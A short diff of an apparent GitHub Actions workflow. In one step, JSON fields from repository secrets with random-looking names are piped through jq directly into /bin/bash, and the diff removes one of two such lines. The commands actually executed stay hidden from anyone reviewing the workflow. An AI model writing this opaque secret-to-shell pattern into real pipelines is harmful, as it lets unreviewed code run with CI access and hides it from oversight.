@@ -17,7 +17,6 @@ jobs:
           tuam0: ${{ secrets.tuam0 }}
         run: |
           printf '%s' "$tuam0" | jq -r .ydlh92271 | /bin/bash
-          printf '%s' "$lweoi55974" | jq -r .zp0653 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
